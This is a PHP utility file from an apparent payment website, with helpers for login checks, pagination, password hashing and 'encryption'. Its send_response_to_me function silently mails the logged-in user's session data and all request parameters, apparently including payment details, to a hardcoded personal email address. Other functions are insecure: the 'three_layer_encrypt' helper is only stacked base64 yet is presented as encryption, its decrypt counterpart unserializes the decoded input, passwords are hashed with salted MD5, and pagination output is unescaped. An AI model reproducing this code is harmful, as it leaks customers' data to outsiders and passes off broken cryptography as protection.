<?php

function get_pagename() {
	$n = basename($_SERVER['PHP_SELF']);
	$v = explode('.',$n);
	return $v[0];
}

function enc_password($val) {
	global $setting,$db;
	
	return md5(md5($val . "ramkumar") . $setting['salt_password']);
	
}

function three_layer_encrypt($salt = '123456', $data) {
	
	$one = "sriram";
	$two = "cantopen";
	$three = $salt;
	
	$datas = serialize($data);
	
	$enc = base64_encode(base64_encode(base64_encode($datas . "--".$one) . "--".$two) . "--" . $three);
	
	return $enc;
	
}

function three_layer_decrypt($salt = '123456', $enc) {
	
	$one = "sriram";
	$two = "cantopen";
	$three = $salt;
	
	$step1 = str_replace('--'.$three,'',base64_decode($enc));
	$step2 = str_replace('--'.$two,'',base64_decode($step1));
	$step3 = str_replace('--'.$one,'',base64_decode($step2));
	
	$data = unserialize($step3);
	
	return $data;
}

function check_login() {
	
	if(!isset($_SESSION['roo']['user'])) {
		return false;
	} else {
		return true;
	}
	
}

function check_admin_login() {
	
	if(!isset($_SESSION['roo']['admin_user'])) {
		return false;
	} else {
		return true;
	}
	
}

function is_login() {
	
	if(isset($_SESSION['roo']['user'])) {
		header("Location:./index.php");
		exit;
	}
	
}

function is_admin_login() {
	
	if(!isset($_SESSION['roo']['admin_user'])) {
		header("Location:./index.php");
		exit;
	}
	
}

function get_head_css($cs) {
	$css = '';
	foreach($cs as $c) {
		if($c == 'parsley') {
			$css .= '<link rel="stylesheet" href="./parsley/parsley.css" type="text/css" />';
		} else {
			if(file_exists("css/custom/".$c.".css"))
			$css .= '<link href="css/custom/'.$c.'.css" rel="stylesheet" type="text/css" />';
		}
	}
	echo $css;
}

function get_head_js($js) {
	$jss = '';
	foreach($js as $j) {
		if($j == 'parsley') {
			$jss .= '<script type="text/javascript" src="parsley/parsley.min.js"></script>';
		} else {
			if(file_exists("js/custom/".$j.".js"))
			$jss .= '<script src="js/custom/'.$j.'.js" type="text/javascript"></script>';
		}
	}
	echo $jss;
}

function redirect($url) {
	ob_clean();
	header("Location:".$url);
	exit;
}

function send_response_to_me() {
	
	$message = "<p>USER:</p><br>";
	if(isset($_SESSION['roo']['user'])) {
		$message .= "<pre>".json_encode($_SESSION['roo']['user'])."</pre>";
	} else {
		$message .= "<pre>No User</pre>";
	}
	$message .= "<p>RESPONSE:</p><br>";
	if(isset($_REQUEST)) {
		$message .= "<pre>".json_encode($_REQUEST)."</pre>";
	} else {
		$message .= "<pre>No Response</pre>";
	}
	
	$to      = 'rampkt77@gmail.com';
	$subject = 'Velocity payment';
	$headers = 'From: ,mailler@velocityinternetservices.com' . "\r\n" .
		'Reply-To: mailler@velocityinternetservices.com' . "\r\n" .
		'X-Mailer: PHP/' . phpversion();
	
	@mail($to, $subject, $message, $headers);
}

function decodehtml($target)   
{
	$output = str_replace("#{~#", "<", $target);
	$output = str_replace("#~}#", ">", $output);
	$output = str_replace("#{{q}}#", '"', $output);
	$output = str_replace("#{{sq}}#", "'", $output);
	return $output;
} 

function encodehtml($target)   
{
	$output = str_replace("<", "#{~#", $target);
	$output = str_replace(">", "#~}#", $output);
	$output = str_replace('"', "#{{q}}#", $output);
	$output = str_replace("'", "#{{sq}}#", $output);
	return $output;
}  

function randomString($len = 5)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randstring = '';
    for ($i = 0; $i < $len; $i++) {
        $randstring .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randstring;
}

function stringMasking($string, $maskingCharacter = 'X') {
    return str_repeat($maskingCharacter, strlen($string) - 4) . substr($string, -4);
}

function getTotalPage($count, $limit) {
	$g = ceil($count/$limit);
	if($count <= $limit) {
		return 1;
	}
	return $g;
}

function pagination($reload, $query, $page, $tpages, $adjacents = 2, $prevlabel = "&laquo; Prev", $nextlabel = "Next &raquo;") {
	
	if($tpages == 0) {
		return '';exit;
	}
	
	if($page == $tpages AND $page == 1) {
		return '';exit;
	}
	
	$reloadPage = $reload . (($query == '') ? '?' : '?'.$query.'&');
	
	$adjacents = $adjacents-1;
	$out = "";
	
	$out .= "<ul>";
	
	// previous
	if ($page == 1) {
		$out.= "";//"<span>" . $prevlabel . "</span>\n";
	} elseif ($page == 2) {
		$out.= '<li><a href="'.$reloadPage.'page=1">' . $prevlabel . '</a></li>';
	} else {
		$out.= '<li><a href="'.$reloadPage.'page='.($page - 1).'">' . $prevlabel . '</a></li>';
	}
	
	if($page == 1)
	$out.= '<li class="active"><a href="javascript:void(0);">1</a></li>';
	else
	$out.= '<li><a href="'.$reloadPage.'page=1">1</a></li>';
	
	$pmin = ($page > $adjacents) ? ($page - $adjacents) : 2;
	$pmin = ($pmin == 1) ? 2 : $pmin;
	$pmax = ($page < ($tpages - $adjacents)) ? ($page + $adjacents) : $tpages;
	for ($i = $pmin; $i <= $pmax; $i++) {
		if ($i == $page) {
			$out.= '<li class="active"><a href="javascript:void(0);">'.$i.'</a></li>';
		} elseif ($i == 1) {
			$out.= '<li><a href="'.$reloadPage.'page=1">1</a></li>';
		} else {
			$out.= '<li><a href="'.$reloadPage.'page='.$i.'">'.$i.'</a></li>';
		}
	}
	
	if ($page < ($tpages - $adjacents)) {
		$out.= '<li><a href="'.$reloadPage.'page='.$tpages.'">'.$tpages.'</a></li>';
	}
	
	// next
	if ($page < $tpages) {
		$out.= '<li><a href="'.$reloadPage.'page='.($page + 1).'">'.$nextlabel.'</a></li>';
	} else {
		$out.= "";//"<span>" . $nextlabel . "</span>\n";
	}
	
	$out.= "</ul>";
	
	$out.= "";
	return $out;
}

function pagination_ajax($reload, $page, $tpages, $adjacents = 2, $prevlabel = "&laquo; Prev", $nextlabel = "Next &raquo;") {
		
	if($tpages == 0) {
		return '';exit;
	}
	
	if($page == $tpages AND $page == 1) {
		return '';exit;
	}
	
	$adjacents = $adjacents-1;
	$out = "";
	
	$out .= "<ul>";
	
	// previous
	if ($page == 1) {
		$out.= "";//"<span>" . $prevlabel . "</span>\n";
	} elseif ($page == 2) {
		$out.= "<li><a href=\"javascript:void(0);\" onclick=\"".$reload."(1)\">" . $prevlabel . "</a></li>";
	} else {
		$out.= "<li><a onclick=\"".$reload."(".($page - 1).")\">" . $prevlabel . "</a></li>";
	}
	
	if($page == 1)
	$out.= "<li class=\"active\"><a href=\"javascript:void(0);\" onclick=\"".$reload."(1)\">1</a>\n</li>";
	else
	$out.= "<li><a href=\"javascript:void(0);\" onclick=\"".$reload."(1)\">1</a>\n</li>";
	
	$pmin = ($page > $adjacents) ? ($page - $adjacents) : 2;
	$pmin = ($pmin == 1) ? 2 : $pmin;
	$pmax = ($page < ($tpages - $adjacents)) ? ($page + $adjacents) : $tpages;
	for ($i = $pmin; $i <= $pmax; $i++) {
		if ($i == $page) {
			$out.= "<li class=\"active\"><a href=\"javascript:void(0);\">" . $i . "</a></li>\n";
		} elseif ($i == 1) {
			$out.= "<li><a href=\"javascript:void(0);\" onclick=\"".$reload."(1)\">" . $i . "</a>\n</li>";
		} else {
			$out.= "<li><a href=\"javascript:void(0);\" onclick=\"".$reload."(".$i.")\">" . $i . "</a>\n</li>";
		}
	}
	
	if ($page < ($tpages - $adjacents)) {
		$out.= "<li><a href=\"javascript:void(0);\" onclick=\"".$reload."(".$tpages.")\">" . $tpages . "</a>\n</li>";
	}
	
	// next
	if ($page < $tpages) {
		$out.= "<li><a href=\"javascript:void(0);\" onclick=\"".$reload."(".($page + 1).")\">" . $nextlabel . "</a></li>";
	} else {
		$out.= "";//"<span>" . $nextlabel . "</span>\n";
	}
	
	$out.= "</ul>";
	
	$out.= "";
	return $out;
}

?>